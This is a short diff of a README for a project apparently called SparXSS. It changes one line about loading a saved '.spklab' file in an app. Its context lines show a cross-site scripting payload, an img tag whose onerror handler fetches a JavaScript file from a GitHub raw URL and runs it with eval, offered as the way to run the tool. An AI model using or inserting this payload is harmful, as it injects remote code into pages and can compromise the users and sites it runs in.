@@ -5,7 +5,7 @@ Run it using:
 <img src=# onerror='fetch("https://raw.githubusercontent.com/Amukerd/SparXSS/main/sparxss.js").then(r=>r.text()).then(c=>eval(c))'>
 ```
 
-The If Statement In The First Line Was Because It Would Execute Multiple Times While I Was Testing It
+You Can Also Download The SparXSS.spklab File And Select 'Open Saved Experiment' When You Open The App
 
 ## ToDo
 - ~~Make Icon's Show up for Every URL~~
